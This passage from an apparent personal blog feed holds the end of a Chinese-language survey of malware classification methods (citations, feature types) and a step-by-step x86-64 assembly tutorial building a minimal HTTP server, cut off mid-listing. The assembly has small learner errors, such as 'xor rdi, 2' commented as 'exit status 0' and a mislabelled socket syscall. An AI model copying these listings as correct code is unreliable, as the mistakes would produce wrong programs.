Anderson B, Quist D, Neil J, Storlie C, Lane T. Graph-based malware detection using dynamic analysis. J Comput Virol 2011;7(4):247–58.</li><li>[22]  Islam R, Tian R, Batten LM, Versteeg S. Classification of malware based on integrated static and dynamic features. J Netw Comput Appl 2013;36(2):646–56.</li><li>[23]  Santos I, Devesa J, Brezo F, Nieves J, Bringas PG. Opem: A static-dynamic approach for machine-learning-based malware detection. In: International joint conference CISIS’12-ICEUTE 12-SOCO 12 special sessions. Springer; 2013, p. 271–80.</li><li>[24]  Dahl GE, Stokes JW, Deng L, Yu D. Large-scale malware classification using random projections and neural networks. In: Acoustics, speech and signal processing, 2013 IEEE international conference on. IEEE; 2013, p. 3422–6.</li><li>[25]  Saxe J, Berlin K. Deep neural network based malware detection using two dimensional binary program features. In: Malicious and unwanted software, 2015 10th international conference on. IEEE; 2015, p. 11–20.</li><li>[26]  Huang W, Stokes JW. MtNet: a multi-task neural network for dynamic mal- ware classification. In: International conference on detection of intrusions and malware, and vulnerability assessment. Springer; 2016, p. 399–418.</li><li>[27]  Kolosnjaji B, Zarras A, Webster G, Eckert C. Deep learning for classification of malware system call sequences. In: Australasian joint conference on artificial intelligence. Springer; 2016, p. 137–49.</li></ul><h3 id="5-4-使用深度学习模型检测和分类恶意代码"><a href="#5-4-使用深度学习模型检测和分类恶意代码" class="headerlink" title="5.4 使用深度学习模型检测和分类恶意代码"></a>5.4 使用深度学习模型检测和分类恶意代码</h3><blockquote><p>然通过使用最先进的深度学习架构提取强大且有用的特征已经取得了有希望的结果，但所提出的模型被证明对对抗性示例高度敏感，这些对抗性示例可以很容易地（仅通过延续输入的部分）被攻击者设计，以欺骗人工智能（AI）驱动的恶意软件分析系统，并使其产生错误的决策[24-29]。</p></blockquote><ul><li>[24]  Dahl GE, Stokes JW, Deng L, Yu D. Large-scale malware classification using random projections and neural networks. In: Acoustics, speech and signal processing, 2013 IEEE international conference on. IEEE; 2013, p. 3422–6.</li><li>[25]  Saxe J, Berlin K. Deep neural network based malware detection using two dimensional binary program features. In: Malicious and unwanted software, 2015 10th international conference on. IEEE; 2015, p. 11–20.</li><li>[26]  Huang W, Stokes JW. MtNet: a multi-task neural network for dynamic mal- ware classification. In: International conference on detection of intrusions and malware, and vulnerability assessment. Springer; 2016, p. 399–418.</li><li>[27]  Kolosnjaji B, Zarras A, Webster G, Eckert C. Deep learning for classification of malware system call sequences. In: Australasian joint conference on artificial intelligence. Springer; 2016, p. 137–49.</li></ul><p><strong>防御对抗性示例的方法</strong></p><ul><li>[28] Grosse K, Papernot N, Manoharan P, Backes M, McDaniel P. Adversarial examples for malware detection. In: European symposium on research in computer security. Springer; 2017, p. 62–79.</li><li>[29] Wang Q, Guo W, Zhang K, Ororbia II AG, Xing X, Liu X, Giles CL. Adversary resistant deep neural networks with an application to malware detection. In: Proceedings of the 23rd ACM SIGKDD international conference on knowledge discovery and data mining. ACM; 2017, p. 1145–53.</li></ul><h3 id="5-5-恶意软件分类的分类法"><a href="#5-5-恶意软件分类的分类法" class="headerlink" title="5.5 恶意软件分类的分类法"></a>5.5 恶意软件分类的分类法</h3><p><img src="/../images/malware-classification/%E6%88%AA%E5%B1%8F2024-06-27%2013.20.10.png" alt="截屏2024-06-27 13.20.10"></p><h4 id="5-5-1-特征提取方法"><a href="#5-5-1-特征提取方法" class="headerlink" title="5.5.1 特征提取方法"></a>5.5.1 特征提取方法</h4><p><strong>静态方法</strong></p><ul><li>使用文件格式提取</li><li>不了解格式的情况下提取字节序列、文件大小、字节熵等</li></ul><p><strong>优点：</strong>覆盖了完整的二进制内容</p><p><strong>缺点：</strong>容易受打包和多态性影响</p><p><strong>动态方法</strong></p><ul><li>从可执行文件的内存映像或其行为中提取特征</li></ul><p>检测可执行文件是否在虚拟机内执行的方法：</p><ul><li>Force UA. Analysis of the Intel Pentium’s ability to support a secure virtual machine monitor. In: Proceedings of the 9th USENIX security symposium. 2000. p. 129.</li><li>Rutkowska J. Redpill: Detect VMM using (almost) one CPU instruction. 2004, <a href="http://invisiblethings.org/papers/redpill.html">http://invisiblethings.org/papers/redpill.html</a>.</li></ul><p><strong>混合方法</strong></p><p>将静态特征提取的特性与动态特征提取的特性结合起来，以实现更高的检测率</p><h4 id="5-5-2-特征种类"><a href="#5-5-2-特征种类" class="headerlink" title="5.5.2 特征种类"></a>5.5.2 特征种类</h4><p><strong>可打印字符串</strong>：从根本上说，大多数恶意软件的功能并不依赖于可打印字符串。因此，当恶意软件创建者发现某些字符串偶然被恶意软件检测器使用时，他们可以消除这些字符串，或者即使可打印字符串是必需的，他们也可以将其分解成分布在不同位置的字符。因此，可打印字符串不是可靠的特征。</p><p><strong>字节序列</strong></p><p>在大多数情况下，字节序列不可靠。这是因为混淆技术，如指令替换和寄存器重新分配，可以分别改变操作码和操作数，这意味着机器代码发生了变化。在所有这些工作中，字节码是静态提取的，但通过打包和多态性使用不同的算法或密钥加密的主程序体会改变字节序列。</p><blockquote><p>Anderson 等人[41]没有直接使用字节序列作为特征，而是将字节序列拟合到马尔可夫模型中，因此他们使用的特征实质上是从一个字节到另一个字节的转移概率。</p><p>Chen 等人[25] 使用每1024字节窗口的字节熵和每个字节的出现次数形成直方图，并将每个轴均匀分成16个区间，形成256长度的特征向量。</p><p>Nataraj 等人[20] 将文件的整个字节序列转换为图片，其中每个字节代表一个像素的灰度。他们发现，属于同一家族的恶意软件在布局和图像上看起来非常相似。用于将一维字节序列转换为二维矩阵的图像宽度由文件大小确定。恶意软件图像的图像特征是使用 Oliva 和 Torralbat [87] 提出的算法计算的。基于图像的技术的主要优点是它们对许多类型的混淆具有鲁棒性[88]。</p></blockquote><p><strong>汇编代码</strong></p><p><strong>API&#x2F;DLL系统调用</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;恶意代码分类报告&quot;&gt;&lt;a href=&quot;#恶意代码分类报告&quot; class=&quot;headerlink&quot; title=&quot;恶意代码分类报告&quot;&gt;&lt;/a&gt;恶意代码分类报告&lt;/h1&gt;&lt;h2 id=&quot;1-恶意代码行为分析&quot;&gt;&lt;a href=&quot;#1-恶意代码行为分析&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pwn-Intro2Cybersecurity</title>
    <link href="http://example.com/2024/06/24/pwn-Intro2Cybersecurity/"/>
    <id>http://example.com/2024/06/24/pwn-Intro2Cybersecurity/</id>
    <published>2024-06-24T04:23:01.000Z</published>
    <updated>2024-11-14T07:50:49.664Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intro-to-Cybersecurity"><a href="#Intro-to-Cybersecurity" class="headerlink" title="Intro to Cybersecurity"></a>Intro to Cybersecurity</h1><h2 id="1-Building-a-Web-Server"><a href="#1-Building-a-Web-Server" class="headerlink" title="1. Building a Web Server"></a>1. Building a Web Server</h2><p><img src="/../images/pwn-Intro2Cybersecurity/%E6%88%AA%E5%B1%8F2024-06-26%2011.52.31.png" alt="截屏2024-06-26 11.52.31"></p><h3 id="1-1-Program-that-exits"><a href="#1-1-Program-that-exits" class="headerlink" title="1.1 Program that exits"></a>1.1 Program that exits</h3><p>使用汇编代码与环境交互</p><p><code>server.s</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix # .intel_syntax 指定汇编器使用Intel语法而不是AT&amp;T语法，noprefix 表明寄存器名称前不需要%前缀</span><br><span class="line">.globl _start  # 声明标签(函数) _start 为全局，_start 是执行开始的地方</span><br><span class="line"></span><br><span class="line">.section .text # 指示汇编器开始一个新的代码段（文本段）、这是存放程序指令的地方</span><br><span class="line"></span><br><span class="line">_start:  # 程序的入口标签</span><br><span class="line">    mov rdi, 0 # rdi 存储传递的第一个参数，这里作为exit系统调用的状态码</span><br><span class="line">    mov rax, 60      # SYS_exit rax寄存器用于指定系统调用的编号，60对应exit系统调用</span><br><span class="line">    syscall # 执行系统调用</span><br><span class="line"></span><br><span class="line">.section .data # 新的数据段</span><br></pre></td></tr></table></figure><h3 id="1-2-Program-that-creates-a-socket"><a href="#1-2-Program-that-creates-a-socket" class="headerlink" title="1.2 Program that creates a socket"></a>1.2 Program that creates a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET     函数传入的第一个参数</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM 传入的第二个参数</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP     传入的第三个参数</span><br><span class="line">    syscall # 系统调用</span><br><span class="line"></span><br><span class="line">    # 退出系统调用</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, 2             # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"> </span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-3-Program-that-binds-a-socket"><a href="#1-3-Program-that-binds-a-socket" class="headerlink" title="1.3 Program that binds a socket"></a>1.3 Program that binds a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 退出系统调用</span><br><span class="line">    # mov rax, 60            # syscall: exit</span><br><span class="line">    # xor rdi, 3             # exit status 0</span><br><span class="line">    # syscall                # 执行退出</span><br><span class="line">        # 检查bind调用是否成功</span><br><span class="line">    test rax, rax          # 检查rax是否为0</span><br><span class="line">    jnz .exit_failure      # 如果不是0，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-4-Program-that-listens-on-a-socket"><a href="#1-4-Program-that-listens-on-a-socket" class="headerlink" title="1.4 Program that listens on a socket"></a>1.4 Program that listens on a socket</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 检查bind调用是否成功</span><br><span class="line">    test rax, rax          # 检查rax是否为0</span><br><span class="line">    jnz .exit_failure      # 如果不是0，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-5-Program-that-accepts-a-connection"><a href="#1-5-Program-that-accepts-a-connection" class="headerlink" title="1.5 Program that accepts a connection"></a>1.5 Program that accepts a connection</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43  # syscall: accept</span><br><span class="line">    mov rdi, 3 # 绑定socket 3</span><br><span class="line">    mov rsi, 0  # NULL</span><br><span class="line">    mov rdx, 0 # NULL</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 检查accept返回值是否为4</span><br><span class="line">    cmp rax, 4</span><br><span class="line">    jne .exit_failure      # 如果不是4，跳转到失败处理</span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-6-Program-that-statically-responds-to-an-HTTP-request"><a href="#1-6-Program-that-statically-responds-to-an-HTTP-request" class="headerlink" title="1.6 Program that statically responds to an HTTP request"></a>1.6 Program that statically responds to an HTTP request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listening</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]     # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512           # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response] # 响应内容的位置</span><br><span class="line">    mov rdx, 19           # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 关闭套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line">.exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-7-Program-that-dynamically-responds-to-an-HTTP-GET-request"><a href="#1-7-Program-that-dynamically-responds-to-an-HTTP-GET-request" class="headerlink" title="1.7 Program that dynamically responds to an HTTP GET request"></a>1.7 Program that dynamically responds to an HTTP GET request</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span 